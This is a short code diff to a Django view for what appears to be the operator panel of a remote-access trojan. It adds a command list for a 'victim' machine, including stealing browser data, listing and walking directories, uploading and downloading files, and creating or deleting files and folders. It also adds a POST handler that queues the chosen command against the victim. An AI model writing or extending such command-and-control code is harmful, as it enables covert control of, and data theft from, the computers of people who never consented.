@@ -11,7 +11,17 @@ def home(response):
     return render(response,"landing/landing.html",data)
 
 def control(response,id:int):
+    commands = ["browser_data","info","back","ls","walk","upload_file","mkfile","mkdir","deldir","delfile","download_file"]
     victim = Api.get_victim_by_id(id)
-    if victim["Status"]:
-        data = {"victim":victim["data"]}
+
+    if response.method == "POST":
+        command=response.POST["command"]
+        params =response.POST["parameters"]
+        d = Api.new_command(command=str(command),target=str(victim["data"][0].name),parameter=params)
+        if victim["Status"]:
+            data = {"victim":victim["data"][0],"commands":commands,"command_sent":bool(d)}
+    else:
+        if victim["Status"]:
+            data = {"victim":victim["data"][0],"commands":commands}
     return render(response,"landing/control.html",data)
+
